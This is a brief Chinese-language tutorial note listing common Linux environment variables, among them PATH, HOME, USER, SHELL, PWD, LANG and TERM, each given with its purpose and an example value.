拓展知识

环境变量包含了许多关键的系统配置和用户设置信息。以下是常见且重要的环境变量及其作用：

核心环境变量(env查看)

  1. PATH
    • 定义可执行程序的搜索路径
    • 格式：/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  2. HOME
    • 当前用户的主目录路径
    • 示例：/home/kyoma
  3. USER / LOGNAME
    • 当前登录用户名
    • 示例：kyoma
  4. SHELL
    • 当前用户默认的 shell
    • 示例：/bin/bash
  5. PWD
    • 当前工作目录路径
    • 示例：/home/kyoma/Documents
  6. LANG / LC_\*
    • 系统语言和本地化设置
    • 示例：en_US.UTF-8
  7. TERM
    • 当前终端类型
    • 示例：xterm-256color
